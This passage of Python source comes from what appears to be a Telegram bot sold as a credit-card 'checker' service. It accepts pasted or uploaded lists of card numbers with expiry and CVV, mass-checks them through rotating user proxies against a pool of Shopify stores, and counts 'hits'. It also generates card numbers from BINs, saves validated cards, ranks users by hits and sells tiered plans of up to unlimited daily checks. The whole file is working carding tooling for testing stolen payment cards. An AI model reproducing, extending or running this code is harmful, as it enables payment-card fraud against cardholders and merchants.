                f"<blockquote>{pe('link')} <b>{sc('Proxy Required')}</b>\n"
                f"/msh {sc('ke liye pehle proxy add karo')}.</blockquote>",
                parse_mode="HTML", reply_markup=kb)
    cards = []
    args = msg.text.split(maxsplit=1)
    if len(args) > 1:
        cards.extend(args[1].replace(",", " ").replace("\n", " ").split())
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text:
            cards.extend(replied.text.replace(",", "\n").split())
        elif replied.document:
            doc = replied.document
            if not (doc.file_name or "").lower().endswith(".txt"):
                return await msg.answer(f"{pe('cross1')} <b>{sc('Only .txt')}</b>", parse_mode="HTML")
            if (doc.file_size or 0) > 2 * 1024 * 1024:
                return await msg.answer(f"{pe('cross1')} <b>{sc('Too large')}</b>", parse_mode="HTML")
            st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>", parse_mode="HTML")
            try:
                f = await msg.bot.get_file(doc.file_id)
                buf = await msg.bot.download_file(f.file_path)
                raw = buf.read().decode("utf-8", errors="ignore")
            except Exception as e:
                return await st.edit_text(f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(str(e))}", parse_mode="HTML")
            cards.extend(re.split(r"[\s,;]+", raw))
            try: await st.delete()
            except Exception: pass
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c)
        if n and n not in seen: normalized.append(n); seen.add(n)
    if not normalized:
        return await msg.answer(f"{pe('docs')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")
    await msg.answer(
        f"{pe('check')} <b>{sc('Mass Start')}</b>\n"
        f"<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(normalized)}</b></blockquote>", parse_mode="HTML")
    await run_mass_check(msg, normalized, msg.bot, bypass_quota=is_admin(uid))

# ══════════════════════════════════════════════════════════════════════════════
# SAFE EDIT
# ══════════════════════════════════════════════════════════════════════════════
async def safe_edit_media(cb, photo, caption, kb):
    m = cb.message
    try:
        if not m.photo:
            try:
                await m.edit_text(caption, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "no text in the message" not in str(e).lower(): raise
        await m.edit_media(media=InputMediaPhoto(media=photo, caption=caption, parse_mode="HTML"), reply_markup=kb)
    except TelegramBadRequest as e:
        err = str(e).lower()
        if "not modified" in err:
            try: await m.edit_reply_markup(reply_markup=kb)
            except Exception: pass
        else:
            try: await m.answer_photo(photo=photo, caption=caption, parse_mode="HTML", reply_markup=kb)
            except Exception:
                try: await m.answer(caption, parse_mode="HTML", reply_markup=kb)
                except Exception: pass
    except Exception:
        try: await m.answer(caption, parse_mode="HTML", reply_markup=kb)
        except Exception: pass

# ══════════════════════════════════════════════════════════════════════════════
# MENU CALLBACKS
# ══════════════════════════════════════════════════════════════════════════════
@router.callback_query(F.data == "menu:main")
async def cb_main(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user:
        return await cb.answer("Try /start", show_alert=True)
    await safe_edit_media(cb, IMG_MAIN, welcome_text(user, cb.from_user.first_name), main_menu_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "menu:close")
async def cb_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "menu:streak")
async def cb_streak(cb: CallbackQuery):
    u = get_user(cb.from_user.id)
    if not u: return await cb.answer("Try /start", show_alert=True)
    text = (f"{pe('heart')} <b>{sc('Streak')}</b>\n"
            f"<blockquote>{pe('online')} {sc('Current')}: <b>{u['streak']}d</b>\n"
            f"{pe('chart')} {sc('Last')}: {u['last_streak_date'] or '—'}\n"
            f"{pe('star')} {sc('Credits')}: <b>{u['credits']}</b></blockquote>")
    await safe_edit_media(cb, IMG_MAIN, text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:health")
async def cb_health(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return await cb.answer("Owner only", show_alert=True)
    try: health = json.loads(get_setting("site_health", "{}") or "{}")
    except Exception: health = {}
    sites = get_sites()
    if not sites: return await cb.answer("No sites", show_alert=True)
    if not health: return await cb.answer("No data yet", show_alert=True)
    lines = [f"{pe('online')} <b>{sc('Site Health')}</b>\n<blockquote>"]
    for site in sites:
        s = health.get(site, "unknown")
        benched = _is_site_benched(site)
        icon = (pe("check") if (s == "ok" and not benched) else
                pe("warn_red") if (s == "down" or benched) else pe("diamond2"))
        lines.append(f"{icon} <code>{site.replace('.myshopify.com', '')}</code> · {s.upper()}{' · BENCHED' if benched else ''}")
    lines.append("</blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")]])
    await safe_edit_media(cb, IMG_CHECK, "\n".join(lines), kb)
    await cb.answer()

@router.callback_query(F.data == "menu:proxy")
async def cb_proxy(cb: CallbackQuery):
    uid = cb.from_user.id
    proxies = user_proxy_all(uid)
    live = sum(1 for p in proxies if p["status"] == "live")
    text = (f"{pe('link')} <b>{sc('Proxy Manager')}</b>\n<blockquote>"
            f"{pe('online')} {sc('Live')}: <b>{live}</b>\n"
            f"{pe('warn')} {sc('Total')}: <b>{len(proxies)}</b>\n\n"
            f"<i>{sc('Format')}: <code>user:pass@host:port</code></i>\n"
            f"<i>{sc('Max')} {LIVE_PROXY_LIMIT} {sc('live proxies')}</i>\n"
            f"<i>{sc('Paste text or upload .txt')}</i></blockquote>")
    try: await cb.answer()
    except Exception: pass
    await safe_edit_media(cb, IMG_TOOLS, text, proxy_kb(uid))

@router.callback_query(F.data == "proxy:add")
async def cb_proxy_add(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "add_proxy")
    text = (f"{pe('add')} <b>{sc('Add Proxies')}</b>\n<blockquote>"
            f"{pe('check')} <b>{sc('Two ways')}:</b>\n\n"
            f"{pe('pen')} <b>{sc('1. Paste text')}:</b>\n<code>user:pass@host:port</code>\n"
            f"{sc('One per line, or comma separated')}\n\n"
            f"{pe('docs')} <b>{sc('2. Upload .txt')}:</b>\n{sc('Send a')} <code>.txt</code> {sc('file with proxies')}\n"
            f"{pe('warn')} <b>{sc('Only AUTH proxies accepted')}</b>\n"
            f"{pe('infinity')} <b>{sc('Max')} {LIVE_PROXY_LIMIT} {sc('live proxies')}</b></blockquote>")
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=back_kb())
    except Exception:
        try: await cb.message.answer(text, parse_mode="HTML", reply_markup=back_kb())
        except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "proxy:check")
async def cb_proxy_check(cb: CallbackQuery):
    uid = cb.from_user.id
    try: await cb.answer("Testing...")
    except Exception: pass
    try: await cb.message.delete()
    except Exception: pass
    st = await cb.message.answer(
        f"{pe('loading')} <b>{sc('Testing proxies')}...</b>\n"
        f"<blockquote>{sc('This may take 10-30 sec')}</blockquote>", parse_mode="HTML")
    try:
        # revalidate via simple check per proxy
        rows = user_proxy_all(uid)
        if not rows:
            await st.edit_text(f"{pe('warn')} <b>{sc('No proxies')}</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
            return
        live = 0
        for r in rows:
            res = await _is_proxy_dead(r["proxy"])
            if not res:
                live += 1
                with db() as c:
                    c.execute("UPDATE user_proxies SET status='live', checked_at=? WHERE uid=? AND proxy=?",
                              (datetime.now(timezone.utc).isoformat(), uid, r["proxy"]))
            else:
                with db() as c:
                    c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, r["proxy"]))
                _remove_from_proxy_pool(r["proxy"])
        await st.edit_text(
            f"{pe('check')} <b>{sc('Revalidated')}</b>\n"
            f"<blockquote>{pe('online')} {sc('Live')}: <b>{live}/{len(rows)}</b>\n"
            f"{pe('warn')} {sc('Dead')}: <b>{len(rows) - live}</b> {sc('removed')}</blockquote>",
            parse_mode="HTML", reply_markup=proxy_kb(uid))
    except Exception as e:
        log.warning(f"proxy check: {e}")
        try: await st.edit_text(f"{pe('cross1')} <b>{sc('Error')}</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        except Exception: pass

@router.callback_query(F.data == "proxy:list")
async def cb_proxy_list(cb: CallbackQuery):
    try: await cb.answer()
    except Exception: pass
    rows = user_proxy_all(cb.from_user.id)
    if not rows:
        try: await cb.message.answer(f"{pe('warn')} <b>{sc('No proxies')}</b>", parse_mode="HTML",
                                     reply_markup=proxy_kb(cb.from_user.id))
        except Exception: pass
        return
    lines = [f"{pe('docs')} <b>{sc('Your Proxies')} ({len(rows)})</b>\n<blockquote>"]
    for r in rows[:30]:
        icon = (pe("check") if r["status"] == "live" else pe("cross2") if r["status"] == "dead" else pe("warn"))
        lat = f"{r['latency']:.2f}s" if r["latency"] else "—"
        display = proxy_display(r['proxy'])
        lines.append(f"{icon} <code>{esc(display[:50])}</code> · {lat}")
    lines.append("</blockquote>")
    try: await cb.message.delete()
    except Exception: pass
    try: await cb.message.answer("\n".join(lines), parse_mode="HTML", reply_markup=proxy_kb(cb.from_user.id))
    except Exception: pass

@router.callback_query(F.data == "proxy:clear")
async def cb_proxy_clear(cb: CallbackQuery):
    try: await cb.answer("Cleared", show_alert=True)
    except Exception: pass
    clear_user_proxies(cb.from_user.id)
    try: await cb_proxy(cb)
    except Exception: pass

@router.callback_query(F.data == "menu:tools")
async def cb_tools(cb: CallbackQuery):
    await safe_edit_media(cb, IMG_TOOLS, f"{pe('tools')} <b>{sc('Tools')}</b>", tools_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("gen:"))
async def cb_gen(cb: CallbackQuery):
    try:
        body = "\n".join(generate_cc(cb.data.split(":")[1], 10))
        text = f"{pe('check')} <b>10 {sc('Cards')}</b>\n<blockquote><code>{body}</code></blockquote>"
        await safe_edit_media(cb, IMG_TOOLS, text, back_kb())
        await cb.answer()
    except Exception as e:
        await cb.answer(f"Error: {e}", show_alert=True)

@router.callback_query(F.data == "menu:refer")
async def cb_refer(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    bot_info = await cb.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{cb.from_user.id}"
    text = (f"{pe('heart')} <b>{sc('Referrals')}</b>\n"
            f"<blockquote>{pe('user')} {sc('Total')}: <b>{user['refer_count']}</b></blockquote>\n"
            f"{pe('link')} <code>{ref_link}</code>\n"
            f"{pe('gem')} 20→Pro · 40→Prem · 80→MAX · 100→Unlimited")
    await safe_edit_media(cb, IMG_MAIN, text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:account")
async def cb_account(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    pk = user["plan"] if user["plan"] in PLANS else "free"
    exp = "Never" if pk == "unlimited" or not user["premium_until"] else user["premium_until"][:10]
    text = (f"{pe('user')} <b>{sc('Account')}</b>\n<blockquote>"
            f"{pe('gem')} {sc('Plan')}: <b>{PLANS[pk]['name']}</b>\n"
            f"{pe('hourglass')} {sc('Expires')}: {exp}\n"
            f"{pe('chart')} {sc('Checks')}: <b>{user['daily_checks']}/{PLANS[pk]['limit']}</b>\n"
            f"{pe('star')} {sc('Credits')}: <b>{user['credits']}</b>\n"
            f"{pe('heart')} {sc('Streak')}: <b>{user['streak']}d</b>\n"
            f"{pe('user')} {sc('Refs')}: <b>{user['refer_count']}</b></blockquote>\n"
            f"{pe('check')} {sc('Total')}: <b>{user['total_checks']}</b> · "
            f"{pe('check2')} {sc('Hits')}: <b>{user['total_hits']}</b>\n\n"
            f"<blockquote>{pe('diamond')} <b>{sc('Plan Limits')}:</b>\n"
            f"• Pro: 5000 Checks/Day\n• Premium: 10000 Checks/Day\n"
            f"• MAX: 30000 Checks/Day\n• Unlimited: No Limit</blockquote>")
    await safe_edit_media(cb, IMG_MAIN, text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:stats")
async def cb_stats(cb: CallbackQuery):
    with db() as c:
        tu = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
        tc = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        th = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"]
        pr = c.execute("SELECT COUNT(*) as n FROM users WHERE plan != 'free'").fetchone()["n"]
    rate = (th / tc * 100) if tc else 0
    text = (f"{pe('chart')} <b>{sc('Global Stats')}</b>\n<blockquote>"
            f"{pe('user')} {sc('Users')} · <b>{tu:,}</b>\n"
            f"{pe('gem')} {sc('Premium')} · <b>{pr:,}</b>\n"
            f"{pe('shop')} {sc('Checks')} · <b>{tc:,}</b>\n"
            f"{pe('check')} {sc('Hits')} · <b>{th:,}</b>\n"
            f"{pe('percent')} {sc('Rate')} · <b>{rate:.1f}%</b></blockquote>")
    await safe_edit_media(cb, IMG_CHECK, text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:history")
async def cb_history(cb: CallbackQuery):
    with db() as c:
        rows = c.execute("SELECT cc, response, status FROM check_logs WHERE uid=? ORDER BY id DESC LIMIT 10", (cb.from_user.id,)).fetchall()
    if not rows: return await cb.answer("No history", show_alert=True)
    lines = [f"{pe('docs')} <b>{sc('History')}</b>"]
    for r in rows:
        icon = pe('check') if r['status'] == 'HIT' else pe('cross2')
        lines.append(f"{icon} <code>{r['cc']}</code> · {esc(r['response'][:30])}")
    await safe_edit_media(cb, IMG_MAIN, "\n".join(lines), back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:saved")
async def cb_saved(cb: CallbackQuery):
    with db() as c:
        rows = c.execute("SELECT cc FROM saved_cards WHERE uid=? ORDER BY id DESC LIMIT 20", (cb.from_user.id,)).fetchall()
    if not rows: return await cb.answer("No saved", show_alert=True)
    body = "\n".join(r["cc"] for r in rows)
    text = f"{pe('book')} <b>{sc('Saved')} · {len(rows)}</b>\n<blockquote><code>{body}</code></blockquote>"
    await safe_edit_media(cb, IMG_MAIN, text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:shop")
async def cb_shop(cb: CallbackQuery):
    try: await cb.answer()
    except Exception: pass
    text = (f"{pe('gem')} <b>{sc('Premium Plans')}</b>\n\n"
            f"<blockquote>{pe('star')} <b>{sc('Available Plans')}:</b>\n"
            f"{pe('check')} <b>Premium</b> - 10000 Checks/Day\n"
            f"{pe('check')} <b>MAX</b> - 30000 Checks/Day\n"
            f"{pe('infinity')} <b>Unlimited</b> - No Limit\n\n"
            f"<i>{sc('Select a plan below to upgrade')}:</i></blockquote>")
    await safe_edit_media(cb, IMG_SHOP, text, shop_kb())

@router.callback_query(F.data == "menu:trial")
async def cb_trial(cb: CallbackQuery):
    uid = cb.from_user.id
    user = get_user_or_create(uid, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    if user["banned"]: return await cb.answer("Banned", show_alert=True)
    now = datetime.now(timezone.utc)
    lu = user["trial_last_used"] or ""
    if lu:
        try:
            last = datetime.fromisoformat(lu)
            if (now - last).days < 7:
                return await cb.answer(f"Wait {7-(now-last).days}d", show_alert=True)
        except Exception: pass
    with db() as c:
        c.execute("UPDATE users SET plan='pro', premium_until=?, trial_last_used=? WHERE uid=?",
                  ((now + timedelta(days=1)).isoformat(), now.isoformat(), uid))
    await cb.answer("Pro Trial · 1 Day", show_alert=True)
    await cb_main(cb)

@router.callback_query(F.data == "menu:check")
async def cb_check_menu(cb: CallbackQuery):
    text = (f"{pe('shop')} <b>{sc('Checker')}</b>\n<blockquote>"
            f"{pe('docs')} <b>{sc('Single Check')}</b>:\n<code>/check CC|MM|YY|CVV</code>\n\n"
            f"{pe('gem')} <b>{sc('Mass Check')}</b>:\n<code>/msh</code> {sc('(reply to .txt or paste cards)')}\n\n"
            f"{pe('warn')} <b>{sc('Proxy required for all checks')}</b></blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")],
        [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
    ])
    await safe_edit_media(cb, IMG_CHECK, text, kb)
    await cb.answer()

@router.callback_query(F.data == "verify_sub")
async def cb_verify(cb: CallbackQuery):
    if await check_force_sub(cb.bot, cb.from_user.id):
        try: await cb.message.delete()
        except Exception: pass
        streak = apply_streak(cb.from_user.id)
        user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
        caption = welcome_text(user, cb.from_user.first_name)
        if streak["reward"]:
            caption += f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}"
        try:
            await cb.bot.send_photo(chat_id=cb.from_user.id, photo=IMG_MAIN, caption=caption,
                                    parse_mode="HTML", reply_markup=main_menu_kb(cb.from_user.id))
        except Exception:
            try:
                await cb.bot.send_message(chat_id=cb.from_user.id, text=caption,
                                          parse_mode="HTML", reply_markup=main_menu_kb(cb.from_user.id))
            except Exception: pass
    else:
        await cb.answer("Join all channels first", show_alert=True)
    try: await cb.answer()
    except Exception: pass

@router.callback_query(F.data.startswith("buy:"))
async def cb_buy(cb: CallbackQuery):
    prod = STAR_PRODUCTS.get(cb.data.split(":", 1)[1])
    if not prod: return await cb.answer("Invalid", show_alert=True)
    try:
        await cb.bot.send_invoice(
            chat_id=cb.from_user.id,
            title=f"{get_branding()['bot_name']} · {prod['label']}",
            description=f"{prod['plan'].title()} for {prod['days']}d",
            payload=f"plan:{prod['plan']}:{prod['days']}",
            provider_token="", currency="XTR",
            prices=[LabeledPrice(label=prod["label"], amount=prod["stars"])])
    except Exception as e:
        return await cb.answer(f"Error: {e}", show_alert=True)
    await cb.answer()

@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    try: await q.answer(ok=True)
    except Exception: pass

@router.message(F.successful_payment)
async def on_paid(msg: Message):
    sp = msg.successful_payment
    if not sp: return
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    parts = (sp.invoice_payload or "").split(":")
    if len(parts) != 3 or parts[0] != "plan": return
    _, plan, ds = parts
    try: days = int(ds)
    except Exception: days = 30
    upgrade_user(uid, plan, days)
    try:
        await msg.answer(f"{pe('check')} <b>{sc('Paid')}</b>\n"
                         f"<blockquote>{pe('gem')} <b>{PLANS[plan]['name']}</b> · {days}d</blockquote>",
                         parse_mode="HTML")
    except Exception: pass

@router.callback_query(F.data.startswith("recheck:"))
async def cb_recheck(cb: CallbackQuery):
    cc = cb.data.split(":", 1)[1]
    try: await cb.answer("Rechecking...")
    except Exception: pass
    if not CC_REGEX.match(cc): return
    await process_check_logic(cb.message, cc, cb.bot, uid=cb.from_user.id, username=cb.from_user.username or "")

@router.callback_query(F.data.startswith("save:"))
async def cb_save(cb: CallbackQuery):
    cc = cb.data.split(":", 1)[1]
    uid = cb.from_user.id
    ensure_user(uid, cb.from_user.username or "")
    with db() as c:
        c.execute("INSERT OR IGNORE INTO saved_cards(uid, cc, saved_at) VALUES (?,?,?)",
                  (uid, cc, datetime.now(timezone.utc).isoformat()))
    await cb.answer("Saved")

@router.callback_query(F.data.startswith("mc:cancel:"))
async def cb_mc_cancel(cb: CallbackQuery):
    ev = _mass_tasks.get(cb.data.split(":", 2)[2])
    if ev: ev.set(); await cb.answer("Cancelling...")
    else: await cb.answer("Done")

# ══════════════════════════════════════════════════════════════════════════════
# ADMIN CALLBACKS
# ══════════════════════════════════════════════════════════════════════════════
@router.callback_query(F.data == "menu:admin_panel")
async def cb_admin_panel(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not admin", show_alert=True)
    try:
        await cb.message.edit_text(f"{pe('settings')} <b>{sc('Admin Panel')}</b>",
                                   parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    except Exception:
        try:
            await cb.message.answer(f"{pe('settings')} <b>{sc('Admin Panel')}</b>",
                                    parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
        except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "admin:main")
async def cb_admin_main(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    try:
        await cb.message.edit_text(f"{pe('settings')} <b>{sc('Admin Panel')}</b>",
                                   parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "admin:close")
async def cb_admin_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "admin:apis")
async def cb_admin_apis(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return await cb.answer("Owner only", show_alert=True)
    data = load_endpoints(force=True)
    lines = [f"{pe('link')} <b>{sc('API Endpoints')}</b>\n<blockquote>"]
    for i, ep in enumerate(data["endpoints"]):
        mark = "● ACTIVE" if i == data["active_idx"] else "○"
        key_part = f" · key={esc(ep['key'])}" if ep.get("key") else ""
        lines.append(f"{mark} [{i+1}] <code>{esc(ep['url'])}</code>{key_part}")
    lines.append("</blockquote>")
    lines.append(f"<i>{sc('Tap a button to switch')}</i>")
    try: await cb.message.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=apis_kb())
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("api:switch:"))
async def cb_api_switch(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return await cb.answer("Owner only", show_alert=True)
    try:
        idx = int(cb.data.split(":")[2])
        data = load_endpoints(force=True)
        if 0 <= idx < len(data["endpoints"]):
            data["active_idx"] = idx
            save_endpoints(data)
            await cb.answer(f"Switched to API #{idx+1}")
            await cb_admin_apis(cb)
        else: await cb.answer("Invalid index")
    except Exception as e:
        await cb.answer(f"Err: {e}")

@router.callback_query(F.data == "admin:force_list")
async def cb_admin_force_list(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    channels = force_channels_list()
    if channels:
        text = (f"{pe('unlock')} <b>{sc('Force Sub Channels')} ({len(channels)})</b>\n"
                f"<blockquote>{sc('Tap to toggle / view details')}</blockquote>")
    else:
        text = (f"{pe('unlock')} <b>{sc('Force Sub Channels')}</b>\n"
                f"<blockquote>{sc('No channels added yet')}.</blockquote>")
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=force_list_kb())
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "admin:force_add")
async def cb_admin_force_add(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "force_add")
    text = (f"{pe('add')} <b>{sc('Add Force Sub Channel')}</b>\n"
            f"<blockquote>{sc('Forward any message from the channel/group you want to add')}.\n\n"
            f"{pe('warn')} {sc('Bot must be admin in that channel/group')}.</blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Cancel"), icon="back", callback_data="admin:force_list")]])
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:force_view:"))
async def cb_admin_force_view(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        chat_id = cb.data.split(":", 2)[2]
        with db() as c:
            ch = c.execute("SELECT * FROM force_channels WHERE chat_id=?", (chat_id,)).fetchone()
        if not ch: return await cb.answer("Not found", show_alert=True)
        status = "ON" if ch["enabled"] else "OFF"
        text = (f"{pe('unlock')} <b>{sc('Force Channel')}</b>\n<blockquote>"
                f"{pe('chat')} <b>{sc('Title')}:</b> {esc(ch['title'] or 'N/A')}\n"
                f"{pe('link')} <b>{sc('ID')}:</b> <code>{esc(ch['chat_id'])}</code>\n"
                f"{pe('diamond')} <b>{sc('Type')}:</b> {esc(ch['chat_type'])}\n"
                f"{pe('online')} <b>{sc('Status')}:</b> {status}\n"
                f"{pe('pen')} <b>{sc('Invite')}:</b> {esc(ch['invite_link'] or 'N/A')}</blockquote>")
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(f"Turn {'OFF' if ch['enabled'] else 'ON'}", icon="refresh", color="success",
                  callback_data=f"admin:force_toggle:{chat_id}")],
            [pbtn(sc("Remove"), icon="trash", color="danger", callback_data=f"admin:force_remove:{chat_id}")],
            [pbtn(sc("Back"), icon="back", callback_data="admin:force_list")],
        ])
        await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:force_toggle:"))
async def cb_admin_force_toggle(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        new = toggle_force_channel(cb.data.split(":", 2)[2])
        await cb.answer(f"{'ON' if new else 'OFF'}")
        await cb_admin_force_view(cb)
    except Exception: await cb.answer("Err")

@router.callback_query(F.data.startswith("admin:force_remove:"))
async def cb_admin_force_remove(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try:
        remove_force_channel(cb.data.split(":", 2)[2])
        await cb.answer("Removed", show_alert=True)
        await cb_admin_force_list(cb)
    except Exception: await cb.answer("Err")

@router.callback_query(F.data.startswith("admin:users:"))
async def cb_admin_users(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    try:
        page = int(cb.data.split(":")[2])
        kb, total, page = users_list_kb(page)
        await cb.message.edit_text(
            f"{pe('user')} <b>{sc('Users')}</b> · {sc('Page')} {page+1}/{max(1, (total+9)//10)}\n"
            f"<blockquote>{sc('Total')}: <b>{total:,}</b></blockquote>",
            parse_mode="HTML", reply_markup=kb)
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:user_view:"))
async def cb_admin_user_view(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    try:
        target = int(cb.data.split(":")[2])
        u = get_user(target)
        if not u: return await cb.answer("Not found", show_alert=True)
        with db() as c:
            proxies = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (target,)).fetchone()["n"]
        text = (f"{pe('user')} <b>{sc('User')} {target}</b>\n<blockquote>"
                f"@{esc(u['username'] or 'N/A')}\n"
                f"{pe('gem')} {sc('Plan')}: <b>{u['plan']}</b>\n"
                f"{pe('star')} {sc('Credits')}: {u['credits']}\n"
                f"{pe('chart')} {sc('Checks')}: {u['total_checks']:,} · {sc('Hits')}: {u['total_hits']:,}\n"
                f"{pe('heart')} {sc('Streak')}: {u['streak']}d\n"
                f"{pe('user')} {sc('Refs')}: {u['refer_count']}\n"
                f"{pe('link')} {sc('Proxies')}: {proxies}\n"
                f"{pe('warn')} {sc('Banned')}: {'YES' if u['banned'] else 'NO'}</blockquote>")
        await cb.message.edit_text(text, parse_mode="HTML",
                                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                                        pbtn(sc("Back"), icon="back", callback_data="admin:users:0")]]))
    except Exception: pass
    await cb.answer()

@router.callback_query(F.data == "admin:banned")
async def cb_admin_banned(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute("SELECT uid, username FROM users WHERE banned=1 LIMIT 30").fetchall()
    if not rows: return await cb.answer("No banned users", show_alert=True)
    lines = [f"{pe('warn')} <b>{sc('Banned')}</b>\n<blockquote>"]
    for r in rows:
        lines.append(f"• <code>{r['uid']}</code> · @{esc(r['username'] or 'anon')}")
    lines.append("</blockquote>")
    await cb.message.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:recent")
async def cb_admin_recent(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute("SELECT cc, response, status FROM check_logs ORDER BY id DESC LIMIT 15").fetchall()
    if not rows: return await cb.answer("No checks yet", show_alert=True)
    lines = [f"{pe('docs')} <b>{sc('Recent')}</b>\n<blockquote>"]
    for r in rows:
        icon = pe('check') if r['status'] == 'HIT' else pe('cross2')
        lines.append(f"{icon} <code>{r['cc']}</code> · {esc(r['response'][:25])}")
    lines.append("</blockquote>")
    await cb.message.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:top")
async def cb_admin_top(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute("SELECT uid, username, total_hits FROM users WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    lines = [f"{pe('chart')} <b>{sc('Top Checkers')}</b>\n<blockquote>"]
    for i, r in enumerate(rows, 1):
        lines.append(f"{i}. <b>{esc(r['username'] or r['uid'])}</b> · {r['total_hits']} hits")
    lines.append("</blockquote>")
    await cb.message.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:clear_cache")
async def cb_admin_clear_cache(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    with db() as c:
        c.execute("DELETE FROM bin_cache")
        c.execute("DELETE FROM user_proxies WHERE status='dead'")
    _invalidate_sites()
    _proxy_dead_cache.clear()
    await cb.answer("Cache cleared", show_alert=True)
    try:
        await cb.message.edit_text(f"{pe('check')} <b>{sc('Cache cleared')}</b>",
                                   parse_mode="HTML", reply_markup=admin_main_kb(cb.from_user.id))
    except Exception: pass

@router.callback_query(F.data == "admin:sites")
async def cb_admin_sites(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    try: health = json.loads(get_setting("site_health", "{}") or "{}")
    except Exception: health = {}
    sites = get_sites()
    ok = sum(1 for v in health.values() if v == "ok")
    benched = sum(1 for s in sites if _is_site_benched(s))
    text = (f"{pe('shop')} <b>{sc('Sites')} ({len(sites)})</b>\n<blockquote>"
            f"{pe('online')} {sc('Healthy')}: <b>{ok}</b>\n"
            f"{pe('warn')} {sc('Benched')}: <b>{benched}</b></blockquote>\n"
            f"<i>{sc('Tap a site to view / remove')}</i>")
    try: await cb.message.edit_text(text, parse_mode="HTML", reply_markup=sites_kb())
    except Exception: pass
    await cb.answer()
